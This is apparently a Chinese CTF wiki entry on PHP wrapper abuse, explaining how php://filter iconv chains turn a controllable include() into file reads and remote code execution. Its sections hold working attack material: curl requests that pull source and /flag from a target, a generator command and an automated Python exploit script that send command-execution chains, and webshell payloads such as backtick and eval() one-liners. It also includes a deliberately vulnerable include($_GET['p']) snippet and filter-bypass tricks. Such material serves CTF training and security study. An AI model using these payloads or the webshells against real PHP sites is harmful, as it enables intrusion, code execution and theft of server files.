---
title: PHP 伪协议与 php://filter 过滤器链（convert.iconv 任意文件读取与 RCE）
category: web
tags: [php, filter-chain, 伪协议, iconv, lfi]
signals:
  - "参数值形如 file=index.php 且能读回 PHP 源码"
  - "请求里出现 php://filter/convert.base64-encode 字样"
  - "源码写 include($_GET['x']) 且参数没有固定前缀"
  - "附件给了 php-fpm 或 php.ini 配置，disable_functions 很长"
  - "过滤了 ../ 与 data:// 却漏掉了 php://filter"
  - "题面提示词出现 伪协议 / 协议 / php:// / filter"
  - "读 /flag 时只回显 base64 或干脆返回空白页"
  - "有 readfile/file_get_contents 但没有任何回显"
  - "include 路径可控，读 /flag 被拦而读 /etc/passwd 正常"
difficulty: hard
source: "Synacktiv / ctf-wiki / PayloadsAllTheThings"
tools: [python, burpsuite, php_filter_chain_generator]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 请求里有明确可控的 include 参数：`?file=index.php`、`?page=home`，且 `index.php` 能读回源码 → 文件包含。
- 想读 `/flag` 时被拒：`php://filter/convert.base64-encode/resource=/flag` 返回空或 `filter` 被 ban。
- 题面/附件出现 `Dockerfile: FROM php:7.4-fpm`、`php.ini`、`open_basedir=/var/www`。
- 提示词：`伪协议`、`协议`、`php://`、`include`、`任意文件读取`、`filter`。
- 想看源码但被 WAF 拦了 `../` 和 `php`：只能靠白名单或大小写技巧绕过。
- **RCE 变体**：能控制被 include 的**完整参数**（含 `php://filter/...`），却上传不了文件，flag 在 `/flag` 且 `disable_functions` 关了一堆。

## 二、原理

### 1. php://filter 基础

`php://filter/<chain>/resource=<目标>` 在**读文件之前**先过一遍 filter 流。常用：

| 写法 | 作用 |
|---|---|
| `php://filter/read=convert.base64-encode/resource=x.php` | 读源码不执行 |
| `php://filter/convert.iconv.utf-8.utf-16/resource=x` | 字符集转换 |
| `php://filter/zlib.deflate/resource=x` | 压缩 |

关键点：**filter 作用在"读取的字节流"上**，只要凑出能被 PHP 当代码解析的字节，就能让 `include 'php://filter/...'` 执行它。

### 2. convert.iconv 过滤器链为什么能 RCE

`convert.iconv.from.to` 构造时**立即把数据块加进过滤器链**，PHP 在 `php_stream_filter_append` 会做一次"过滤器链探测"：喂预置的特殊字节穿过整条链，检查有没有转换失败。

Synacktiv 的洞察是：把过滤器**触发顺序**玩出"先转义、再删除、再补字节"的效果，可以凭空造出任意 ASCII。核心四件套：

1. `convert.iconv.UTF8.CSISO2022KR` —— 添加固定的 `\x1b$)C`
2. `convert.base64-decode` —— 删掉非法 base64 字符，只留合法字母
3. `convert.iconv.UTF8.UTF7` —— 把 `\x1b$)C` 这类垃圾字节吞掉（解码后丢弃）
4. `convert.iconv.8859_3.UTF8` / `CP1399.UTF8` 之类 —— 在特定字节上**插入新的 ASCII 字符**

把几十/上百个"过滤器对"串起来，就能在没有文件写入、没有上传的情况下，让 `include php://filter/...` 读到一段以 `<?php ... ?>` 开头的内容 —— **纯 RCE**。

### 3. 两种利用方向

| 方向 | 能力要求 | 用途 |
|---|---|---|
| **读**（base64-encode） | 只要 include 参数可控 | 读源码、读 `/flag`（base64 后粘出来） |
| **写**（convert.iconv 链） | 同上，且 PHP 能 include 该 filter | 生成任意 PHP 代码，RCE |

## 三、解题步骤

1. **确认包含点**：`?file=index.php` 读回源码；再试 `?file=../../../../etc/passwd`（或 `/proc/self/environ`）。
2. **加 base64 编码**防执行：`?file=php://filter/convert.base64-encode/resource=index.php`。
3. **读 flag**：`?file=php://filter/convert.base64-encode/resource=/flag`；被拦则试 `read=convert.base64-encode|convert.base64-encode` 双编码。
4. **读不到 /flag 就走 RCE**：确认 `include` 的**整个参数**可控（`?p=php://filter/...`，而非 `include "pages/".$_GET['p']`）。
5. **生成链**：`python php_filter_chain_generator.py --chain '<?=system("cat /flag");?>'`。
6. **请求**：把生成的 `php://filter/convert.iconv...` 整个塞进参数，URL 编码后发送，看回显。
7. **无回显**：改用 `<?=system($_GET[0]);?>` 或 `<?=eval($_POST[0]);?>`，再带参数二次请求。

## 四、可直接运行的脚本

生成器（Synacktiv 官方）：

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator
cd php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?=system("id");?>'
```

本地最小复现：

```php
<?php  // index.php —— 漏洞点：include 整个参数可控
include $_GET['p'];
```

```bash
# 读源码
curl -s 'http://TARGET/index.php?p=php://filter/convert.base64-encode/resource=index.php' | base64 -d

# 读 /flag
curl -s 'http://TARGET/index.php?p=php://filter/convert.base64-encode/resource=/flag' | base64 -d
```

一键利用脚本（把生成器输出自动 URL 编码并发送）：

```python
import subprocess, sys, requests

GEN = "php_filter_chain_generator.py"
payload = '<?=`$_GET[0]`;?>'          # 反引号执行，短且省长度

chain = subprocess.check_output(
    [sys.executable, GEN, "--chain", payload], text=True
).strip().splitlines()[-1].split(": ")[-1]

r = requests.get("http://TARGET/index.php",
                 params={"p": chain, "0": "id"}, timeout=20)
print(r.text)
```

手工验证"链如何插入字节"（iconv 转 CSISO2022KR 会插入 `\x1b$)C`）：

```python
import subprocess
print(subprocess.run(
    ["iconv", "-f", "UTF-8", "-t", "CSISO2022KR"],
    input=b"<?php", capture_output=True).stdout)   # b'\x1b$)C<?php'
```

## 五、常见坑 / 变体

- **`include "pages/".$_GET['p']`** 带前缀的写法传 `php://filter/...` 会失效（前缀让协议解析失败）。只能靠 `../` 吃掉前缀，或转 LFI + 日志包含。
- **`allow_url_include=Off`** 只影响 `http://`、`data://`、`php://input`，**不影响 `php://filter`**。
- **`php` 被正则 ban**：试 `php://filter//convert.base64-encode` 双斜杠、`string.rot13`、`convert.quoted-printable-encode` 组合。
- **只 ban 单次 base64**：`php://filter/read=convert.base64-encode|convert.base64-encode/resource=/flag`。
- **链太长撞 URL 长度限制**：先落盘一个短 webshell（`<?=`$_GET[0]`;?>`），再用它干活。
- **`convert.iconv` 不可用**：容器没装 iconv 扩展 → `php -m | grep iconv` 确认。
- **无回显**：`include` 走输出缓冲，用 `<?=...?>` 而非 `<?php ... ?>`；或用 `error_log` 写文件。
- **变体：`data://` 组合** —— `php://filter/convert.base64-decode/resource=data://...`，需 `allow_url_include=On`。
- **变体：`zip://` / `phar://`** 读文件与触发反序列化，见 `phar-deserialization.md`。
- **变体：`php://fd/N`** 读 PHP 进程已打开的文件描述符（如日志 fd）。
- **变体**：`file_get_contents($_GET['x'])` 只读不回显 → 只能读不能写，链生成器不适用。

## 六、参考来源

- [PHP filters chain: What is it and how to use it? — Synacktiv](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it)
- [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
- [PHP 手册：过滤器（Filter）](https://www.php.net/manual/zh/filters.php)
- [PayloadsAllTheThings — PHP filter chain](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [CTF Wiki — PHP 伪协议](https://www.ctf-wiki.org/)
- [HackTricks — PHP Tricks](https://book.hacktricks.wiki/en/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/index.html)
